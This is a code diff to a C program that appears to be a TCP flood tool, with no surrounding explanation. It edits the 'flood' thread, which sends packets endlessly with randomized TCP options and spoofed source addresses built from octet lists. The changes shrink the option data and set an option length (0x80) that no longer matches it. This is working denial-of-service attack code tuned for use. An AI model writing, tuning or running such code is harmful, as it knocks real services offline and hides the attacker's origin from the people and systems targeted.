@@ -30,7 +30,7 @@ struct tcpopts
 {
     uint8_t kind;
     uint8_t length;
-    uint8_t data[8];
+    uint8_t data[6];
 };
 void init_rand(unsigned long int x)
 {
@@ -187,8 +187,8 @@ char *genPayload(int size)
 void setupTcpOpts(struct tcpopts *opts)
 {
     opts->kind = 0x70;
-    opts->length = 0x0C;
-    memcpy(opts->data, genPayload(10), 10);
+    opts->length = 0x80;
+    memcpy(opts->data, genPayload(6), 6);
 }
 
 void *flood(void *par1)
@@ -230,7 +230,7 @@ void *flood(void *par1)
     while (1)
     {
 
-        memcpy(opts->data, genPayload(10), 10);
+        memcpy(opts->data, genPayload(6), 6);
         tcph->check = 0;
         tcph->doff = 8;
         tcph->dest = htons(floodport);
@@ -239,9 +239,9 @@ void *flood(void *par1)
         tcph->window = htons(windows[randnum(0, 2)]);
 
         uint8_t first_octet_options[16] = {151, 188, 37, 51, 176, 5, 92, 172, 8, 198, 192, 155, 140, 144, 55, 132};
-        uint8_t second_octet_options[16] = {80, 165, 187, 89, 31, 196, 222, 64, 46, 41, 112, 155, 1, 170, 0, 128};
-        uint8_t third_octet_options[8] = {1, randnum(0, 255), 255, 113, 0, 36, 128, 192};
-        uint8_t fourth_octet_options[8] = {1, randnum(0, 255), 255, 4, 0, 32, 64, 16};
+        uint8_t second_octet_options[16] = {80, 165, 187, 89, 31, 196, 222, 64, 46, 41, 112, 155, 1, 170, 32, 128};
+        uint8_t third_octet_options[8] = {1, randnum(1, 255), 255, 113, 16, 36, 128, 192};
+        uint8_t fourth_octet_options[8] = {1, randnum(1, 255), 255, 4, 10, 32, 64, 16};
         uint8_t first_octet = first_octet_options[randnum(0, 15)];
         uint8_t second_octet = second_octet_options[randnum(0, 15)];
         uint8_t third_octet = third_octet_options[randnum(0, 7)];
